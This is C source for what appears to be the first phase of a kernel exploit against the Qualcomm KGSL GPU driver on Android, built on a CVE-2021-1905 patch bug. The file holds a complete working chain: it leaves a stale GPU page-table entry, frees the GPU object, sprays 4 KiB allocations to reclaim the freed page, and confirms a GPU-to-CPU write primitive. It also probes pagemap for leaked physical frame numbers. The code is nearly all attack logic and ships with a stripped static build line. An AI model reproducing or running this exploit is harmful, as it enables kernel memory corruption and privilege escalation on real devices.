/* kgsl-poolreclaim.c — Phase-1 self-verifying reclaim of a stale SVM PTE.
 *
 * Chain:
 *   1. SVM entry E (2x order-0 pages); mmap#1 -> G1; mremap-shrink; mmap#2 -> G2
 *      (CVE-2021-1905 patch#2 bug; G1 left mapped but untracked).
 *   2. GPUOBJ_FREE(E) + munmap both vmas -> E destroyed; kgsl_mmu_put_gpuaddr(G2)
 *      only; E's 2 pages go to the kgsl order-0 page pool (FIFO, zeroed).
 *   3. Drain the pool with 4 KiB SVM allocations F_i.  After each, CP_MEM_WRITE(G1,
 *      MAGIC) and read F_i's CPU page.  The first F_i whose page aliases G1 shows
 *      MAGIC -> exact pool depth at free time, and a live GPU->CPU write primitive
 *      into a reclaimed GPU object.
 *
 * Pinned to one CPU.  Build: zig cc -target arm-linux-musleabihf -static -O2
 * -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL
#define MAGIC 0xC0FFEE42u
#define MAXSPRAY 16384
#define BATCH    64

struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_gpuobj_free  { uint64_t flags, priv; unsigned int id, type, len; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp;
};
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_FREE   _IOW (KGSL_IOC_TYPE,0x46,struct kgsl_gpuobj_free)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d

static int fd;
static uint32_t *cmd, *mark;
static uint64_t cgpu, mgpu; static unsigned cid, cctx;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){ cnt&=0x3fff;op&=0x7f; return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23); }
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }

static int cp_write(uint64_t gpuaddr, uint32_t val){
    uint32_t *p=cmd; memset(cmd,0,0x40);
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,gpuaddr); *p++=val;
    int ndw=(int)(p-cmd);
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=cgpu; cob.size=(uint64_t)ndw*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=cgpu; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=cid;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=cctx;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    return ioctl(fd,IOCTL_GPU_COMMAND,&gc);
}
static int g_alloc(uint64_t sz,unsigned *id){
    struct kgsl_gpuobj_alloc a; memset(&a,0,sizeof a); a.size=sz; a.flags=USE_CPU_MAP; a.va_len=sz;
    errno=0; int r=ioctl(fd,IOCTL_GPUOBJ_ALLOC,&a); if(id)*id=a.id; return r;
}
static int g_info(unsigned id,struct kgsl_gpuobj_info *o){ memset(o,0,sizeof *o); o->id=id; errno=0; return ioctl(fd,IOCTL_GPUOBJ_INFO,o); }
static int g_free(unsigned id){ struct kgsl_gpuobj_free f; memset(&f,0,sizeof f); f.id=id; errno=0; return ioctl(fd,IOCTL_GPUOBJ_FREE,&f); }

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(240);
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs);
    printf("== kgsl pool-reclaim Phase1 (uid=%d) ==\n",(int)getuid());

    /* recon: is unprivileged /proc/self/pagemap PFN-visible on this 3.18? */
    {
        void *a=mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        if(a!=MAP_FAILED){
            *(volatile char*)a=1;
            int pf=open("/proc/self/pagemap",O_RDONLY);
            if(pf>=0){
                uint64_t e=0; off_t off=((uintptr_t)a/4096)*8;
                ssize_t n=pread(pf,&e,8,off);
                printf("[pagemap] addr=%p n=%zd entry=0x%llx present=%d pfn=0x%llx %s\n",
                       a,n,(unsigned long long)e,(int)(e>>63),
                       (unsigned long long)(e & ((1ULL<<55)-1)),
                       (n==8 && (e>>63)) ? "PFN VISIBLE" : "(no present bit / blocked)");
                close(pf);
            } else printf("[pagemap] open failed: %s\n",strerror(errno));
        }
    }

    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca)<0){ printf("[-] cmd: %s\n",strerror(errno)); return 1; }
    cid=ca.id; cgpu=ca.gpuaddr;
    cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)cid<<12);
    if(cmd==MAP_FAILED){ printf("[-] mmap cmd: %s\n",strerror(errno)); return 1; }
    memset(cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma); mgpu=ma.gpuaddr;
    mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    if(ioctl(fd,IOCTL_CTXT_CREATE,&cc)<0){ printf("[-] ctxt: %s\n",strerror(errno)); return 1; }
    cctx=cc.drawctxt_id;

    /* sanity: CP path works */
    mark[0]=0; cp_write(mgpu,0x12345678u); usleep(150000);
    if(mark[0]!=0x12345678u){ printf("[-] CP sanity FAILED mark=0x%08x\n",mark[0]); return 1; }
    printf("[0] CP sanity OK\n");

    /* --- create + double-region E (2 pages), then free --- */
    unsigned eid=0;
    if(g_alloc(0x2000,&eid)<0){ printf("[-] alloc E: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpuobj_info ei;
    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)eid<<12);
    if(v1==MAP_FAILED){ printf("[-] mmap1: %s\n",strerror(errno)); return 1; }
    g_info(eid,&ei); uint64_t G1=ei.gpuaddr;
    void *m=mremap(v1,0x2000,0x1000,0); if(m!=MAP_FAILED) v1=m;
    g_info(eid,&ei);
    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)eid<<12);
    g_info(eid,&ei); uint64_t G2=ei.gpuaddr;
    printf("[1] E id=%u G1=0x%llx G2=0x%llx%s\n",eid,
           (unsigned long long)G1,(unsigned long long)G2,(G1&&G2&&G1!=G2)?"":" (BAD)");
    g_free(eid);
    if(v2!=MAP_FAILED) munmap(v2,0x2000);
    munmap(v1,0x1000);
    { struct kgsl_gpuobj_info chk; errno=0; int rr=g_info(eid,&chk);
      printf("[2b] INFO freed E rc=%d errno=%d (want rc=-1 EINVAL -> destroyed)\n",rr,errno); }
    printf("[2] E freed + vmas unmapped; G1 stale, pages -> kgsl order-0 pool\n");

    /* --- drain the pool with 4 KiB SVM allocs; one CP write per batch --- */
    static void *maps[MAXSPRAY];
    int hit=-1; long allocs=0; int batches=0;
    for(int i=0;i<MAXSPRAY && hit<0;i+=BATCH){
        int n=0;
        for(; n<BATCH && i+n<MAXSPRAY; n++){
            unsigned id=0;
            if(g_alloc(0x1000,&id)<0){ if(n==0) printf("[!] alloc failed at %d: %s\n",i,strerror(errno)); break; }
            void *p=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
            if(p==MAP_FAILED){ if(n==0) printf("[!] mmap failed at %d: %s\n",i,strerror(errno)); break; }
            maps[i+n]=p;
        }
        if(n==0) break;
        allocs+=n; batches++;
        cp_write(G1,MAGIC);
        usleep(15000);                     /* let the CP retire for the batch */
        for(int j=0;j<n;j++) if(*(volatile uint32_t*)maps[i+j]==MAGIC){ hit=i+j; break; }
        if((batches & 7)==0) printf("    ... %ld allocs, no alias yet\n",allocs);
    }
    printf("[3] sprayed %ld x 4KiB in %d batches; first G1 alias hit at index %d\n",allocs,batches,hit);
    if(hit>=0){
        printf("[+] RECLAIM CONFIRMED: E's page == F[%d] (pool depth ~= %d pages)\n",hit,hit);
        printf("    G1 (stale PTE) -> F[%d] page; CPU alias carries GPU writes.\n",hit);
    } else {
        printf("[-] no alias within %d allocs (pool deeper, or pages went to buddy)\n",MAXSPRAY);
    }
    if(cctx){ struct kgsl_drawctxt_destroy x={cctx}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n");
    return 0;
}
